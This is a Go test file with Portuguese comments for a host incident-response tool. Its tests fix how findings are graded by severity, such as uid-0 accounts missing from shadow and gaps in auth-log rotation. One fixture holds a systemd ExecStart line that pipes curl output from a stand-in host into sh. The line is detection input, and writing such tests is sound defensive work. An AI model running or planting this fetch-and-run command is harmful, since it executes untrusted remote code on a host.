package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/facts"
)

// A SEVERIDADE é a saída acionável: ela decide a ordem do bloco "AGORA, nesta
// ordem" e decide o exit code. Uma decisão de severidade sem teste é uma
// decisão que ninguém está olhando — e a medição de mutação mostrou quatro
// delas: rebaixar CRÍTICO para aviso, ou aviso para informativo, não quebrava
// teste nenhum.
//
// Informativo é o pior dos rebaixamentos: achado INFO não chega ao exit code,
// então a automação de frota deixa de ver.

func sev1(t *testing.T, c check.Check, f *facts.Facts) check.Finding {
	t.Helper()
	f.Index()
	r := check.Run([]check.Check{c}, f, testEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("queria exatamente 1 achado, veio %d: %+v", len(r.Findings), r.Findings)
	}
	return r.Findings[0]
}

// Conta só no passwd é aviso; conta só no passwd COM uid 0 é a linha exata do
// acesso permanente, e é crítica.
func TestContaSemShadowSobePorUidZero(t *testing.T) {
	// Shell de NÃO-login: com um shell de verdade a conta já sobe para crítica
	// por outro ramo, e o teste não estaria medindo o ramo do uid.
	comum := &facts.Facts{Accounts: []facts.Account{
		{Name: "app", UID: 1500, SemShadow: true, Shell: "/usr/sbin/nologin"},
	}}
	if got := sev1(t, contaSemShadow, comum).Sev; got != check.SevWarn {
		t.Errorf("conta comum sem shadow = %v, queria WARN", got)
	}
	raiz := &facts.Facts{Accounts: []facts.Account{
		{Name: "sync", UID: 0, SemShadow: true, Shell: "/bin/bash"},
	}}
	if got := sev1(t, contaSemShadow, raiz).Sev; got != check.SevCritical {
		t.Errorf("uid 0 sem shadow = %v, queria CRITICAL: é a soma das duas coisas "+
			"que faz a linha do backdoor clássico", got)
	}
}

// Buraco de rotação num log qualquer é aviso. Em log de AUTENTICAÇÃO é
// crítico: é ele que datava a entrada, e é o primeiro que se apaga.
func TestBuracoDeRotacaoSobeEmLogDeAutenticacao(t *testing.T) {
	// Gerações 0 e 2 presentes, a 1 ausente: é o buraco.
	comum := &facts.Facts{Logs: []facts.ArquivoDeLog{
		{Path: "/var/log/syslog", Base: "syslog", Geracao: 0},
		{Path: "/var/log/syslog.2.gz", Base: "syslog", Geracao: 2},
	}}
	f1 := sev1(t, rotacaoComBuraco, comum)
	if f1.Sev != check.SevWarn {
		t.Errorf("buraco em syslog = %v, queria WARN", f1.Sev)
	}
	auth := &facts.Facts{Logs: []facts.ArquivoDeLog{
		{Path: "/var/log/auth.log", Base: "auth.log", Geracao: 0},
		{Path: "/var/log/auth.log.2.gz", Base: "auth.log", Geracao: 2},
	}}
	f2 := sev1(t, rotacaoComBuraco, auth)
	if f2.Sev != check.SevCritical {
		t.Errorf("buraco em auth.log = %v, queria CRITICAL: é o log que data a "+
			"entrada, e o primeiro que um invasor apaga", f2.Sev)
	}
}

// Pivô é AVISO, e precisa continuar sendo: informativo não chega ao exit code,
// e um host que serve de caminho para a rede interna é decisão de contenção.
func TestPivoEhAvisoENaoInformativo(t *testing.T) {
	// O socket chega ao processo pelo INODE do fd, que é como o índice real é
	// construído — pôr PID no socket não basta.
	f := &facts.Facts{
		Processes: []facts.Process{{
			PID: 900, Exe: "/usr/bin/app", Comm: "app", FDs: sockFDs(11, 12),
		}},
		Sockets: []facts.Socket{
			{Proto: "tcp", State: "ESTAB", Inode: 11, Dir: facts.DirOut,
				PeerIP: "203.0.113.7", PeerPort: 443, PeerScope: facts.ScopePublic},
			{Proto: "tcp", State: "ESTAB", Inode: 12, Dir: facts.DirOut,
				PeerIP: "10.0.0.9", PeerPort: 22, PeerScope: facts.ScopePrivate},
		},
	}
	if got := sev1(t, pivot, f).Sev; got != check.SevWarn {
		t.Errorf("pivô = %v, queria WARN — achado INFO não chega ao exit code, e "+
			"a automação de frota lê o exit code", got)
	}
}

// --- decisões de LÓGICA que o comentário declara e nenhum teste fixava ---

// A linha do tempo da §16 começa na PRIMEIRA entrada daquela origem, não na
// última. O comentário de `quandoEntrou` diz isso com todas as letras, e a
// medição de mutação mostrou que trocar a conjunção não quebrava nada — ou
// seja, a data que ancora a janela do incidente não tinha teste.
func TestQuandoEntrouEhAPrimeiraENaoAUltima(t *testing.T) {
	ss := []entrada{
		{quando: "2026-08-17T22:00:00Z"},
		{quando: "2026-08-15T03:12:00Z"}, // a primeira
		{quando: "2026-08-18T09:30:00Z"},
	}
	if got := quandoEntrou(ss); got != "2026-08-15T03:12:00Z" {
		t.Errorf("quandoEntrou = %q, queria a MAIS ANTIGA: é ela que começa a "+
			"linha do tempo, e uma janela ancorada na última entrada esconde "+
			"tudo que aconteceu antes", got)
	}
}

// Entrada SEM data não pode virar a âncora: string vazia ordena antes de
// qualquer data, e sem a guarda ela venceria a comparação.
func TestEntradaSemDataNaoViraAncora(t *testing.T) {
	ss := []entrada{{quando: ""}, {quando: "2026-08-15T03:12:00Z"}, {quando: ""}}
	if got := quandoEntrou(ss); got != "2026-08-15T03:12:00Z" {
		t.Errorf("quandoEntrou = %q: entrada sem data não é entrada mais antiga", got)
	}
}

// O corte de socket órfão conta o que está ESTABELECIDO e sem dono. As duas
// condições, e não uma: sem a conjunção, todo socket em LISTEN sem dono entraria
// na conta e a lacuna declarada ficaria maior do que é.
func TestSocketOrfaoContaSoOEstabelecido(t *testing.T) {
	f := &facts.Facts{Sockets: []facts.Socket{
		{State: "ESTAB", PID: 0},     // conta
		{State: "LISTEN", PID: 0},    // não conta: não é conexão
		{State: "ESTAB", PID: 900},   // não conta: tem dono
		{State: "TIME-WAIT", PID: 0}, // não conta
	}}
	got := partialForOrphanSockets(f)
	if len(got) != 1 {
		t.Fatalf("partial = %v", got)
	}
	if !strings.HasPrefix(got[0], "1 conexões") {
		t.Errorf("só o ESTABELECIDO sem dono conta, e são 1 dos 4: %q", got[0])
	}
}

// Truncar lista de pares e de PIDs precisa DIZER quantos ficaram de fora — o
// corte silencioso já foi defeito nesta base mais de uma vez.
func TestCortesDizemQuantoFicouDeFora(t *testing.T) {
	var socks []facts.Socket
	for i := 0; i < 10; i++ {
		socks = append(socks, facts.Socket{PeerIP: "10.0.0." + itoa2(i), PeerPort: 443})
	}
	got := joinPeers(socks, 3)
	if !strings.Contains(got, "+7") {
		t.Errorf("joinPeers = %q: o corte precisa dizer quantos sobraram", got)
	}
	// E o teto é INCLUSIVO: com exatamente `max` itens não há corte nenhum.
	if s := joinPeers(socks[:3], 3); strings.Contains(s, "…") {
		t.Errorf("três itens com teto três não é corte: %q", s)
	}

	pids := []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
	if s := listaDePIDs(pids); !strings.Contains(s, "+") {
		t.Errorf("listaDePIDs = %q: o corte precisa dizer quantos sobraram", s)
	}
}

func itoa2(n int) string { return string(rune('0' + n)) }

// A razão de cobertura não pode sair duplicada, e o slice do Facts não pode ser
// ALIASADO por um check.
//
// São dois defeitos numa linha só: `r.Partial = f.PersistDenied[x]` faz o
// Result apontar para o array do Facts — que é compartilhado por todos os
// checks —, e a linha repetida logo abaixo duplicava cada razão na seção em
// que a ferramenta se audita.
func TestPartialNaoDuplicaNemAliasaOFato(t *testing.T) {
	razao := "2 diretórios de unit de usuário ilegíveis"
	f := &facts.Facts{
		PersistDenied: map[string][]string{"unit": {razao}},
		Units: []facts.Unit{{
			Name: "x.service", Path: "/etc/systemd/system/x.service",
			Exec: []facts.ExecLine{{Key: "ExecStart", Cmd: "/usr/bin/curl http://x/y | sh"}},
		}},
	}
	f.Index()
	r := check.Run([]check.Check{unitExecSuspect}, f, testEnv())

	var n int
	for _, p := range r.Coverage.Partial {
		for _, m := range p.Reasons {
			if m == razao {
				n++
			}
		}
	}
	if n != 1 {
		t.Errorf("a razão apareceu %d vezes na cobertura, queria 1", n)
	}

	// E o fato do host não pode ter sido tocado pelo check.
	if len(f.PersistDenied["unit"]) != 1 || f.PersistDenied["unit"][0] != razao {
		t.Errorf("o check alterou o Facts compartilhado: %v", f.PersistDenied["unit"])
	}
}
